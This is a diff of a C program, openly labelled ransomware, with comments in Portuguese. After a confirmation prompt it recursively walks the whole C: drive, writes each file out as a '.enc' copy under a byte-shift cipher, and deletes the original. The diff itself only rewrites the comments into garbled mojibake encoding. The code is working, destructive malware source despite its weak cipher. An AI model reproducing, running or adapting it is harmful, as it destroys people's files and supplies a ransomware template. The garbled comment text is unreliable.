@@ -1,23 +1,23 @@
-#include <stdio.h>      // Biblioteca para entrada e saída de dados
-#include <Windows.h>   // Biblioteca para manipulação de arquivos no Windows
-#include <string.h>    // Biblioteca para manipulação de strings
-#include <stdlib.h>    // Biblioteca para alocação de memória e funções gerais
+#include <stdio.h>      // Biblioteca para entrada e saÃ­da de dados
+#include <Windows.h>   // Biblioteca para manipulaÃ§Ã£o de arquivos no Windows
+#include <string.h>    // Biblioteca para manipulaÃ§Ã£o de strings
+#include <stdlib.h>    // Biblioteca para alocaÃ§Ã£o de memÃ³ria e funÃ§Ãµes gerais
 
-#define INVALID_FOLDER 0x16  // Define um valor simbólico para diretórios inválidos
+#define INVALID_FOLDER 0x16  // Define um valor simbÃ³lico para diretÃ³rios invÃ¡lidos
 
-// Declaração das funções antes de sua implementação
+// DeclaraÃ§Ã£o das funÃ§Ãµes antes de sua implementaÃ§Ã£o
 void iterateFolder(char initialPath[]);
 void encryptFile(char sourceFilePath[], char destinationFilePath[]);
 void decryptFile(char sourceFilePath[], char destinationFilePath[]);
 
 int main() {
-    char userInput[256];  // Buffer para armazenar a entrada do usuário
+    char userInput[256];  // Buffer para armazenar a entrada do usuÃ¡rio
     printf("Are you sure to run the ransomware? ");  // Exibe a mensagem no console
-    scanf("%255s", userInput);  // Lê a entrada do usuário e evita buffer overflow
+    scanf("%255s", userInput);  // LÃª a entrada do usuÃ¡rio e evita buffer overflow
 
-    // Verifica se o usuário confirmou a execução
+    // Verifica se o usuÃ¡rio confirmou a execuÃ§Ã£o
     if (strcmp(userInput, "yes") == 0) {
-        iterateFolder("C:");  // Chama a função para percorrer os arquivos da unidade C
+        iterateFolder("C:");  // Chama a funÃ§Ã£o para percorrer os arquivos da unidade C
     }
     return 0;
 }
@@ -30,10 +30,10 @@ void iterateFolder(char initialPath[]) {
     }
 
     char path[260];
-    snprintf(path, sizeof(path), "%s\\*", initialPath);  // Constrói o caminho para buscar arquivos
+    snprintf(path, sizeof(path), "%s\\*", initialPath);  // ConstrÃ³i o caminho para buscar arquivos
 
-    WIN32_FIND_DATA fdata;  // Estrutura para armazenar informações dos arquivos encontrados
-    HANDLE hFind = FindFirstFileA(path, &fdata);  // Obtém o primeiro arquivo na pasta
+    WIN32_FIND_DATA fdata;  // Estrutura para armazenar informaÃ§Ãµes dos arquivos encontrados
+    HANDLE hFind = FindFirstFileA(path, &fdata);  // ObtÃ©m o primeiro arquivo na pasta
 
     if (hFind == INVALID_HANDLE_VALUE) {  // Verifica se a busca falhou
         printf("Path not found or invalid: %d\n", GetLastError());
@@ -41,20 +41,20 @@ void iterateFolder(char initialPath[]) {
     }
     
     do {
-        // Ignora os diretórios "." e ".."
+        // Ignora os diretÃ³rios "." e ".."
         if (strcmp(fdata.cFileName, ".") != 0 && strcmp(fdata.cFileName, "..") != 0) {
             char subPath[260];
             snprintf(subPath, sizeof(subPath), "%s\\%s", initialPath, fdata.cFileName);
 
-            // Verifica se o item encontrado é um diretório
+            // Verifica se o item encontrado Ã© um diretÃ³rio
             if (fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-                iterateFolder(subPath);  // Chama a função recursivamente para percorrer subpastas
+                iterateFolder(subPath);  // Chama a funÃ§Ã£o recursivamente para percorrer subpastas
             } else {
                 char encryptedFilePath[260];
                 snprintf(encryptedFilePath, sizeof(encryptedFilePath), "%s.enc", subPath); // Cria nome do arquivo criptografado
                 
                 printf("Encrypting: %s\n", subPath);
-                encryptFile(subPath, encryptedFilePath);  // Chama a função de criptografia
+                encryptFile(subPath, encryptedFilePath);  // Chama a funÃ§Ã£o de criptografia
             }
         }
     } while (FindNextFile(hFind, &fdata) != 0);  // Continua a busca por mais arquivos na pasta
@@ -63,8 +63,8 @@ void iterateFolder(char initialPath[]) {
 }
 
 void encryptFile(char sourceFilePath[], char destinationFilePath[]) {
-    FILE *sourceFile = fopen(sourceFilePath, "rb");  // Abre o arquivo de origem para leitura binária
-    FILE *destinationFile = fopen(destinationFilePath, "wb");  // Abre o arquivo de destino para escrita binária
+    FILE *sourceFile = fopen(sourceFilePath, "rb");  // Abre o arquivo de origem para leitura binÃ¡ria
+    FILE *destinationFile = fopen(destinationFilePath, "wb");  // Abre o arquivo de destino para escrita binÃ¡ria
 
     if (!sourceFile || !destinationFile) {  // Verifica se os arquivos foram abertos corretamente
         printf("Error opening files\n");
@@ -72,13 +72,13 @@ void encryptFile(char sourceFilePath[], char destinationFilePath[]) {
     }
     
     int c;
-    while ((c = fgetc(sourceFile)) != EOF) {  // Lê byte a byte do arquivo original
-        fputc(c + 3, destinationFile);  // Aplica uma cifra simples de substituição (César) e grava no novo arquivo
+    while ((c = fgetc(sourceFile)) != EOF) {  // LÃª byte a byte do arquivo original
+        fputc(c + 3, destinationFile);  // Aplica uma cifra simples de substituiÃ§Ã£o (CÃ©sar) e grava no novo arquivo
     }
 
     fclose(sourceFile);  // Fecha o arquivo original
     fclose(destinationFile);  // Fecha o arquivo criptografado
-    remove(sourceFilePath);  // Remove o arquivo original após criptografá-lo
+    remove(sourceFilePath);  // Remove o arquivo original apÃ³s criptografÃ¡-lo
 }
 
 void decryptFile(char sourceFilePath[], char destinationFilePath[]) {
@@ -91,8 +91,8 @@ void decryptFile(char sourceFilePath[], char destinationFilePath[]) {
     }
 
     int c;
-    while ((c = fgetc(sourceFile)) != EOF) {  // Lê byte a byte do arquivo criptografado
-        fputc(c - 3, destinationFile);  // Aplica a reversão da cifra de substituição
+    while ((c = fgetc(sourceFile)) != EOF) {  // LÃª byte a byte do arquivo criptografado
+        fputc(c - 3, destinationFile);  // Aplica a reversÃ£o da cifra de substituiÃ§Ã£o
     }
 
     fclose(sourceFile);  // Fecha o arquivo criptografado
